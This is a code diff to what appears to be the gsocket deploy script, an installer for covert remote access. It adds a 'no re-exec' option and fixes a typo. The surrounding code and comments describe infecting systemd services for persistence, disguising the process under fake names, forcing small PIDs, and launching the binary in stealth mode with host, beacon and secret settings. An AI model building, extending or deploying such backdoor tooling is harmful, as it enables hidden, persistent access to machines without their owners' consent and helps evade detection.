@@ -30,7 +30,7 @@
 # GS_NOINST=1
 #		- Do not install gsocket
 # GS_OSARCH=x86_64-linux or mipsel32-linux etc
-#       - Force architecutre to a specific package (for testing purpose only)
+#       - Force architecture to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
 # GS_URL_BASE=https://gsocket.io
@@ -45,6 +45,8 @@
 #       - Try NO to infect a systemd service before any other persistency
 # GS_NOFFPID=1
 #       - Do not fast forward to a small pid.
+# GS_NOREEXEC=1
+#       - Do not re-exec or change argv0.
 # GS_NAME="[kcached]"
 #       - Specify custom hidden name file & process. Default is picked at random.
 # GS_BIN="fg"
@@ -182,6 +184,8 @@ GS_SYSTEMD_PERSIST="oneshot"
 [[ -n $GS_NOINFECT ]] && unset GS_INFECT
 GS_FFPID=1
 [[ -n $GS_NOFFPID ]] && unset GS_FFPID
+GS_REEXEC=1
+[[ -n "$GS_NOREEXEC" ]] && unset GS_REEXEC
 unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
 
 # systemd candidates for binary infection
@@ -1119,7 +1123,7 @@ config2bin() {
 
 	[[ -n "$LDSO" ]] && exec_arr=("$LDSO")
 	exec_arr+=("${src}")
-	TERM=xterm-256color GS_CCG="${GS_CCG}" GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${exec_arr[@]}" || return 255
+	TERM=xterm-256color GS_CCG="${GS_CCG}" GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${exec_arr[@]}" || return 255
 	[[ -n "$dst_final" ]] && {
 		cat "${dst}" >"${dst_final}"
 		rm -f "${dst:?}"
@@ -1141,6 +1145,7 @@ bin2config() {
 	unset GS_CONFIG_BEACON
 	unset GS_CONFIG_HOST
 	unset GS_CONFIG_PORT
+	unset GS_CONFIG_REEXEC
 	[[ ! -f "${exe}" ]] && return 255
 	[[ ! -f "${bin}" ]] && return 255
 
